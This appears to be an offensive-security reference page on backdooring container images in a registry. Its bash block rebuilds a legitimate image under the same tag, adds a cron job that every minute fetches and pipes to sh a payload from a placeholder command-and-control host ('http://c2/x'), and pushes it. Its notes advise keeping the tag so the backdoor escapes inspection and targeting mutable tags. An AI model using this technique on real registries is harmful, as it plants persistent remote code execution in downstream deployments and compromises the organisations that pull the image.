---
title: "Image backdooring: planting a malicious container image"
description: "Planting a backdoored container image by injecting a malicious layer, entrypoint, or dependency and pushing it to a tag that downstream systems pull, so the attacker's code runs wherever the image is deployed."
keywords:
  - image backdoor
  - malicious layer
  - entrypoint injection
  - supply chain
  - container image
---

# Image backdooring

With push access to a registry (stolen credentials, an open registry, or a compromised CI), an attacker replaces or publishes an image so that deploying it runs their code. The backdoor can be an added layer, a modified entrypoint, or a poisoned dependency pulled at build time.

```bash
# Rebuild from the real image with an added payload, keep the same tag
cat > Dockerfile <<'DF'
FROM <acct>/<repo>:<tag>
RUN echo '* * * * * root curl -s http://c2/x | sh' > /etc/cron.d/x
DF
docker build -t <acct>/<repo>:<tag> . && docker push <acct>/<repo>:<tag>
```

## Exploitation notes

- Keeping the original tag and base makes the image behave normally, so the backdoor survives casual inspection; the cron or entrypoint addition is the foothold.
- Mutable tags (`latest`, environment tags) are the highest-value targets because deployments re-pull them.
- Reaching push access is covered under [Registry access](registry-access.md) and [Unauthenticated registry access](unauthenticated-registry-access.md).

## References

- [OCI image specification](https://github.com/opencontainers/image-spec)
- [SLSA: supply chain threats](https://slsa.dev/spec/v1.0/threats)
